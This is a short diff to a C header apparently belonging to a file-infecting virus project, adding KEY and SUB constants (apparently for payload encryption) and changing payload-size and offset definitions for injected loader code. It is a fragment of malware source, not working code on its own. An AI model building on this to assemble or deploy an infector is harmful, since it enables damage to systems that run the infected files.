@@ -12,6 +12,8 @@
 # include <fcntl.h>
 # include <limits.h>
 
+# define KEY 0x12345678
+# define SUB 0x95837523
 # define MAGIC_VIRUS 0x4E505241
 # define SIGN_SIZE 0x28
 
@@ -19,8 +21,8 @@
 # define BUF_SIZE 0x20
 # define END_SIZE 0x5B
 # define LOADER_SIZE 0x7C
-# define PAYLOAD_SIZE 0x2679 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x25df - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x273e - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x26a4 - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
 # define OFFSET_1 0x1e43 - FT_MEMCPY_ADDR
